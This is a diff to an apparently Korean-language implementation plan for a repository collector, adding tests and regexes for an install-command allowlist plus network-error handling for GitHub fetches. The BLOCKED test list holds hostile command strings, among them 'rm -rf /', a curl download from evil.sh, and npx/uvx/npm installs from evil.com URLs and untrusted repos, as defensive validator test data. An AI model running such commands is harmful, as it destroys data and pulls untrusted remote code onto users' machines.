@@ -945,6 +945,14 @@ ALLOWED = [
     "pip install 'crewai[tools]'",
     "npm install -g @anthropic-ai/claude-code",
     "git clone https://github.com/owner/repo.git",
+    "claude mcp add -e KEY=x fetch -- uvx mcp-server-fetch",
+    "npx -y create-foo@1.2.3",
+    "npx -y @scope/pkg@latest --port 3000",
+    "uvx --from mcp-server-git mcp-server-git",
+    "uvx black==24.1.0",
+    "uvx ruff@0.6.0 check",
+    "npm install create-foo@1.2.3",
+    "npm install -g @scope/pkg@latest",
 ]
 
 BLOCKED = [
@@ -956,6 +964,35 @@ BLOCKED = [
     "git clone https://evil.com/x",
     "sudo npm install -g x",
     "npx x && echo hi",
+    "claude mcp add x -- rm -rf /",
+    "claude mcp add x -- sh -c 'curl -fsSL https://evil.sh/x -o /tmp/x'",
+    "claude mcp add x rm -- npx y",
+    "npx -y github:evil/pkg",
+    "npx -y evil/pkg",
+    "npx -y https://evil.com/pkg.tgz",
+    "npx -y git+https://github.com/evil/pkg",
+    "npx -y ./local-pkg",
+    "npx -y /abs/pkg",
+    "npx 'a",
+    "pip install 'crewai[tools]",
+    "uvx github:evil/pkg",
+    "uvx evil/pkg",
+    "uvx https://evil.com/x.whl",
+    "uvx git+https://github.com/evil/pkg",
+    "uvx ./local-pkg",
+    "uvx /abs/pkg",
+    "uvx ../pkg",
+    "uvx --from https://evil.com/x.whl t",
+    "uvx --from git+https://github.com/evil/pkg t",
+    "uvx --from ./local t",
+    "claude mcp add x -- uvx --from https://evil.com/x.whl t",
+    "npm install -g evil/pkg",
+    "npm install github:evil/pkg",
+    "npm install https://evil.com/x.tgz",
+    "npm install git+https://github.com/evil/pkg",
+    "npm install ./local",
+    "npm install /abs/pkg",
+    "npm install ../pkg",
 ]
 
 
@@ -992,6 +1029,10 @@ def test_fresh_beats_stale():
     assert score(100, 10, 1) > score(100, 10, 80)
 
 
+def test_future_push_date_does_not_exceed_freshness_cap():
+    assert score(100, 10, -30) == score(100, 10, 0)
+
+
 def test_negative_delta_and_old_push_do_not_go_negative():
     assert score(0, -50, 400) == 0.0
 ```
@@ -1003,19 +1044,25 @@ Expected: FAIL (`ModuleNotFoundError`)
 
 - [ ] **Step 3: 구현**
 
-`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다):
+`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다. `claude mcp add`는 `--` 뒤에 npx/uvx만, npx·npm install 패키지는 일반 npm 이름만, uvx(`--from` 포함)는 PyPI 이름만(`github:`·`owner/repo`·URL·경로 거부), 따옴표는 짝이 맞아야 한다):
 ```python
 import re
 
-_ARG = r"[\w.@/:=,'\[\]-]+"
+_TOKEN = r"[\w.@/:=,\[\]-]+"
+_ARG = rf"(?:{_TOKEN}|'{_TOKEN}')"  # 따옴표는 짝이 맞을 때만
+_PKG = r"(?:@\w[\w.-]*/)?\w[\w.-]*(?:@[\w.-]+)?"  # npm 패키지명만. github:, URL, 경로 거부
+_NPX = rf"npx(?: -y)? {_PKG}(?: {_ARG})*"
+_PYPKG = r"\w[\w.-]*(?:\[[\w,-]+\])?(?:(?:==|@)[\w.-]+)?"  # PyPI 이름(버전 지정 포함)만. URL, 경로 거부
+_UVX = rf"uvx(?: --from {_PYPKG})? {_PYPKG}(?: {_ARG})*"
+_MCP_OPT = r"(?:-s|--scope|-e|--env|-t|--transport) [\w.=:/-]+"
 PATTERNS = [re.compile(p) for p in (
     r"/plugin marketplace add [\w.-]+/[\w.-]+",
     r"/plugin install [\w.@-]+",
-    rf"claude mcp add( {_ARG})+",
-    rf"npx( -y)? {_ARG}( {_ARG})*",
-    rf"uvx {_ARG}( {_ARG})*",
-    r"pip install [\w.'\[\],=-]+",
-    r"npm install( -g)? [\w.@/-]+",
+    rf"claude mcp add(?: {_MCP_OPT})* [\w.-]+ -- (?:{_NPX}|{_UVX})",
+    _NPX,
+    _UVX,
+    r"pip install (?:[\w.\[\],=-]+|'[\w.\[\],=-]+')",
+    rf"npm install(?: -g)? {_PKG}",
     r"git clone https://github\.com/[\w.-]+/[\w.-]+",
 )]
 
@@ -1040,14 +1087,14 @@ def weekly_delta(stars: int, old: int | None) -> int | None:
 def score(stars: int, weekly_delta: int | None, days_since_push: float) -> float:
     growth = math.log1p(max(weekly_delta or 0, 0)) * 3
     popularity = math.log1p(max(stars, 0))
-    freshness = max(0.0, 1 - days_since_push / 90) * 2
+    freshness = max(0.0, 1 - max(days_since_push, 0) / 90) * 2
     return round(growth + popularity + freshness, 3)
 ```
 
 - [ ] **Step 4: 통과 확인**
 
 Run: `cd collector && uv run pytest tests/test_install_cmd.py tests/test_scoring.py -v`
-Expected: 22 passed
+Expected: 60 passed
 
 - [ ] **Step 5: Commit**
 
@@ -1072,6 +1119,9 @@ git commit -m "feat: add install command allowlist and repo scoring"
 - [ ] **Step 1: 실패하는 테스트 작성** — `collector/tests/test_github.py`
 
 ```python
+import httpx
+
+from collector.sources import github
 from collector.sources.github import merge, parse_search
 
 
@@ -1094,6 +1144,31 @@ def test_merge_dedupes_repos_found_under_multiple_topics():
     a = parse_search({"items": [item("a/b"), item("x/y")]})
     b = parse_search({"items": [item("a/b")]})
     assert [r["full_name"] for r in merge([a, b])] == ["a/b", "x/y"]
+
+
+def fake_get_timeout_on_third_call():
+    calls = []
+
+    def get(url, **kwargs):
+        calls.append(url)
+        if len(calls) == 3:
+            raise httpx.ReadTimeout("timeout")
+        return httpx.Response(200, json={"items": [item(f"o/r{len(calls)}")]})
+    return get
+
+
+def test_fetch_skips_topic_on_network_error(monkeypatch):
+    monkeypatch.setattr(github.time, "sleep", lambda s: None)
+    monkeypatch.setattr(github.httpx, "get", fake_get_timeout_on_third_call())
+    names = [r["full_name"] for r in github.fetch()]
+    assert names == [f"o/r{i}" for i in range(1, len(github.TOPICS) + 1) if i != 3]
+
+
+def test_fetch_readme_returns_none_on_network_error(monkeypatch):
+    def get(url, **kwargs):
+        raise httpx.ReadTimeout("timeout")
+    monkeypatch.setattr(github.httpx, "get", get)
+    assert github.fetch_readme("o/r") is None
 ```
 
 `collector/tests/test_run_repos.py`:
@@ -1187,9 +1262,13 @@ def fetch() -> list[dict]:
     for i, topic in enumerate(TOPICS):
         if i:
             time.sleep(delay)
-        r = httpx.get(f"{API}/search/repositories", headers=_headers(), timeout=20, params={
-            "q": f"topic:{topic} stars:>=20 pushed:>={since}", "sort": "stars", "order": "desc", "per_page": 50,
-        })
+        try:
+            r = httpx.get(f"{API}/search/repositories", headers=_headers(), timeout=20, params={
+                "q": f"topic:{topic} stars:>=20 pushed:>={since}", "sort": "stars", "order": "desc", "per_page": 50,
+            })
+        except httpx.HTTPError as e:
+            log.warning("search %s failed: %s", topic, e)
+            continue
         if r.status_code != 200:
             log.warning("search %s failed: %s", topic, r.status_code)
             continue
@@ -1198,8 +1277,12 @@ def fetch() -> list[dict]:
 
 
 def fetch_readme(full_name: str) -> str | None:
-    r = httpx.get(f"{API}/repos/{full_name}/readme", headers=_headers(raw=True),
-                  timeout=20, follow_redirects=True)
+    try:
+        r = httpx.get(f"{API}/repos/{full_name}/readme", headers=_headers(raw=True),
+                      timeout=20, follow_redirects=True)
+    except httpx.HTTPError as e:
+        log.warning("readme %s failed: %s", full_name, e)
+        return None
     return r.text if r.status_code == 200 else None
 ```
 
